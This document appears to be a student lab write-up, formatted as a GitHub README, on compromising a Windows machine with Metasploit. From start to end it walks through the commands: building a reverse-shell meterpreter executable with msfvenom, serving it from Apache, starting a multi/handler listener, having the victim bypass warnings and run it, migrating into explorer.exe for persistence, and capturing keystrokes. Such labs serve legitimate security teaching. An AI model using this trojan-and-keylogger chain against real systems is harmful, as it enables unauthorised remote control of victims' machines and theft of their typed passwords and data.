# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:

<img width="946" height="427" alt="447218037-c093655e-0989-4eb3-98e5-c042c1cda3d9" src="https://github.com/user-attachments/assets/20918fa0-d490-453c-a231-2bce23c580a0" />


Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="1020" height="201" alt="447218046-0f0ca97f-e473-405f-bb33-e6738d7d2049" src="https://github.com/user-attachments/assets/41c0d95f-1e2b-42b1-8da2-0d28a9faa0f2" />


copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
<img width="481" height="74" alt="447218050-757d7b7e-56c9-4c78-9e49-4766d63c28fa" src="https://github.com/user-attachments/assets/eb912841-e255-4d08-87f0-e6078ec9227e" />


Start apache server
sudo systemctl apache2 start
## OUTPUT:
<img width="404" height="58" alt="447218064-75372f68-8931-4df9-b8bf-c7a22661bbb9" src="https://github.com/user-attachments/assets/3a818c6a-0b11-4637-9b0d-29f44cbf7b6a" />


Check the status of apache2
## OUTPUT:

<img width="1451" height="873" alt="447218073-38296299-b395-459e-8a39-987bc38fbdb4" src="https://github.com/user-attachments/assets/206c5e66-b239-48ad-a3cf-d5effc16260f" />


Invoke msfconsole:
## OUTPUT:
<img width="908" height="903" alt="447218081-e7f3583a-e817-41ca-9acc-54a04136eb33" src="https://github.com/user-attachments/assets/047c2902-01a1-42bc-9713-766a40467b72" />




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:

<img width="868" height="615" alt="447218091-debec4f8-1c7a-47e3-96d6-e7fc2a926016" src="https://github.com/user-attachments/assets/cfdcf4c4-807b-4cdc-830a-2d3dc41be57a" />


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:

<img width="661" height="120" alt="447218099-46f0141b-8d25-454d-b97d-3cc458877e81" src="https://github.com/user-attachments/assets/86a892e1-cdd9-45a4-9a24-467471c5d199" />



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:



Bypass any warning boxes, double-click the file, and allow it to run.

<img width="1023" height="240" alt="513352814-93dc5c1a-b290-41a1-850b-b9d5f3a5a5d4" src="https://github.com/user-attachments/assets/14c36105-5db9-4163-ae71-57ebb303d8a3" />



On kali/parrot give the command exploit
## OUTPUT:

<img width="661" height="120" alt="447218099-46f0141b-8d25-454d-b97d-3cc458877e81" src="https://github.com/user-attachments/assets/cf5ae746-d34a-4e3b-b84c-75b4bf9fa23b" />


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:

<img width="1707" height="901" alt="447218287-1da5f416-47d2-4328-8636-35f1a9264f2f" src="https://github.com/user-attachments/assets/155405fc-22f9-42ca-ba7d-5ea9781e60cc" />


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
## OUTPUT:


at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 




Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:

<img width="963" height="186" alt="447218308-12d9ca46-699a-4b5b-8cbb-f76709fcc349" src="https://github.com/user-attachments/assets/c8f8560e-0647-455c-bb12-a47e90ec5c58" />



keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:

<img width="707" height="138" alt="447218335-1ba444fa-82d6-4671-a1a1-0920e89a7f78" src="https://github.com/user-attachments/assets/0c222f93-b47f-4b2f-a9fc-211c75107b29" />



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
